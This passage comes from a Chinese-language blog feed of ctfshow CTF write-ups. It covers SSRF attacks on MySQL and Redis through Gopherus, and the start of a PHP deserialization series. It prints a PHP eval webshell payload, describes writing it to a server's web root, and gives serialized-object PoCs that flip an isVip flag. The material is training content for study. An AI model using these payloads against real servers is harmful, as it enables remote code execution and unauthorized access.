data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335107292-3c92991d-dada-496f-8b43-14be5a4e8eef.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>当然，除了满足MySQL未授权外，还需要MySQL开启允许导出文件以及知道网站根目录，本漏洞才能成功利用，缺一不可。</p><p>这个 <code>/var/www/html</code> 目录是如何知道的呢？应该是爆破的…</p><p>生成的 POC 里，<code>_</code> 字符后面的内容还要 URL编码一次，因为 PHP接收到POST或GET请求数据，会自动进行一次URL解码，然后，比如 %00 解码后，PHP会直接截断。。</p><p>最终 POC</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335618842-0ce07752-0b70-41d0-8a06-53666b73008b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335618842-0ce07752-0b70-41d0-8a06-53666b73008b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>然后在 c.php 里面 <code>cat /flag.txt</code> 即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335868031-a7034018-b9ca-4614-9841-adbf4dae281b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335868031-a7034018-b9ca-4614-9841-adbf4dae281b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>flag</p><p>ctfshow{d9cfb450-02d7-4b13-9170-4b9306d01a34}</p><p>顺便嫖一下 check.php 代码 （</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;returl&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;returl&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|dict/i&quot;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="keyword">echo</span> _request(<span class="string">&quot;<span class="subst">$url</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_request</span>(<span class="params"><span class="variable">$curl</span>,<span class="variable">$https</span>=<span class="literal">true</span>,<span class="variable">$method</span>=<span class="string">&#x27;get&#x27;</span>,<span class="variable">$data</span>=<span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(); <span class="comment">//初始化</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$curl</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_FOLLOWLOCATION,<span class="literal">true</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="literal">false</span>);<span class="comment">//设置不需要头信息</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);<span class="comment">//获取页面内容，但不输出</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$https</span>)</span><br><span class="line">&#123;</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSL_VERIFYPEER,<span class="literal">FALSE</span>);<span class="comment">//不做服务器认证</span></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSL_VERIFYHOST,<span class="literal">FALSE</span>);<span class="comment">//不做客户端认证</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$method</span>==<span class="string">&#x27;post&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST,<span class="literal">true</span>);<span class="comment">//设置请求是post方式</span></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);<span class="comment">//设置post请求数据</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=curl_exec(<span class="variable">$ch</span>);<span class="comment">//执行访问</span></span><br><span class="line">curl_close(<span class="variable">$ch</span>);<span class="comment">//关闭curl，释放资源</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p><p>当然还可以有其他利用方式，比如构造 POST 请求进行 SQL注入，文件上传等</p><h2 id="web360-打Redis"><a href="#web360-打Redis" class="headerlink" title="web360 打Redis"></a>web360 打Redis</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><p>题目提示</p><blockquote><p>打redis</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和上题差不多，也是用 Gopherus 打 redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What <span class="keyword">do</span> you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell): <span class="string">&#x27;&lt;?php eval($_GET[c]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336273546-c62d1e21-eb3a-4b1f-bf3d-a465da571d9a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336273546-c62d1e21-eb3a-4b1f-bf3d-a465da571d9a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>URL编码一下 <code>_</code> 后面的内容</p><p>默认生成的 webshell 在 <code>shell.php</code> 中</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336584841-57607e0e-bc57-4150-b438-687be09da1b6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336584841-57607e0e-bc57-4150-b438-687be09da1b6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>发的包会超时，不过没事，<code>shell.php</code> 是会生成的。</p><p>最后 <code>cat /flaaag</code> 即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336665246-42e4102e-d001-4430-aa7e-08d630b511cb.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336665246-42e4102e-d001-4430-aa7e-08d630b511cb.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><hr><p><strong>一些参考的题解</strong></p><p><a href="https://www.freebuf.com/articles/web/263512.html">https://www.freebuf.com/articles/web/263512.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctfshow </category>
          
          <category> ctf练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctfshow </tag>
            
            <tag> ctf练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 反序列化篇</title>
      <link href="//p/2021/ctfshow-unserialize/"/>
      <url>//p/2021/ctfshow-unserialize/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>感觉排序不是很友好..因为难度不是相对递增的</p><p>建议顺序 web254-258、web260、web262-web266、web259、web261、web275-276</p><p>然后 web277-278 是 Python 反序列化，不过比较简单</p><p>最后是 web267-web274 都是框架的反序列化漏洞，分析起来会麻烦些</p><p>web267-270 是 Yii 的 CVE 和 绕过，web271-273 是 Laravel 5.7 和 5.8 的反序列化，</p><p>web274是 thinkphp5.1 的反序列化</p><p>框架的反序列化有空会（咕咕预订…）额外写文章复现，23333</p><h2 id="web254-PHP类简单认识"><a href="#web254-PHP类简单认识" class="headerlink" title="web254 PHP类简单认识"></a>web254 PHP类简单认识</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h2 id="web255-简单逻辑"><a href="#web255-简单逻辑" class="headerlink" title="web255 简单逻辑"></a>web255 简单逻辑</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>即要满足</p><ul><li>类成员 <code>isVip</code> 为 <code>true</code></li><li>传入的 <code>username</code> 和 类成员 <code>username</code> 相等</li><li>传入的 <code>password</code> 和 类成员 <code>password</code> 相等</li></ul><p>username 和 password 已知，反序列化修改 <code>isVip</code> 即可</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$user</span>-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617609858827-cb7aea08-34e9-4b27-b7d2-01a64db413bf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617609858827-cb7aea08-34e9-4b27-b7d2-01a64db413bf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web256-简单逻辑"><a href="#web256-简单逻辑" class="headerlink" title="web256 简单逻辑"></a>web256 简单逻辑</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> 